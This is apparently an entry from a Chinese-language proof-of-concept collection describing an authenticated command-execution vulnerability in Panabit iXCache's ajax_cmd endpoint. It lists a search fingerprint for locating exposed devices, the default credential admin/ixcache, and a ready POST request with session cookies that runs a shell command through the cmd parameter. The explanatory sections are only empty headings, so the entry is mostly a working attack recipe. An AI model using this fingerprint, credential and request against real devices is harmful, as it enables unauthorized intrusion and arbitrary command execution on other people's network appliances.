# PanabitiXCacheajax_cmd存在后台命令执行漏洞

- **系统**：PanabitiXCacheajax　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="iXCache"`
- **请求**：`POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ls HTTP/1.1`

**请求体 / payload**
```
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie
2. 使用上一步获取的cookie，执行命令
Host:
X-Requested-With: XMLHttpRequest
Cookie: _walkthrough-introduction=0; pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331; pauser_1628486854_900424=paonline_admin_84071_16289322461
Content-Length: 0
```

**其他**
- Panabit iXCache ajax\_cmd存在后台命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复习
***
- 版本: * Panabit iXCache